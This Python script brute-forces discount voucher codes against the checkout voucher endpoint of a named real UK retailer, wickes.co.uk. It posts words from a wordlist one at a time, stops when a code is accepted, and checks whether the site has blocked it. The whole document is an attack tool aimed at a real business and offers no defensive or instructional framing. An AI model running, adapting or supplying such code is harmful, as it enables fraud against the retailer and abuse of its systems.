import requests

voucherPostURL = "https://www.wickes.co.uk/checkout-rs/user/cart/vouchers/"

alphabet = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]

wordList01 = open('words.txt')
wordList01Read = wordList01.readlines()

def post(string):
    cleanString = string.strip()
    post = requests.post(voucherPostURL + cleanString)

    print(voucherPostURL + cleanString)
    print(post)
    print(post.json())

    return post

loopIndex = 0
for x in wordList01Read:
    print("Loop index: " + str(loopIndex))
    if loopIndex > 4807:
        request = post(x)

        if request.status_code == 200:
            print("found working discount code!!!")
            break
        elif request.status_code == 403:
            print("We are blocked!!!")
            break
        loopIndex = loopIndex + 1
    else:
        loopIndex = loopIndex + 1
        print("skipping current loop index")
        continue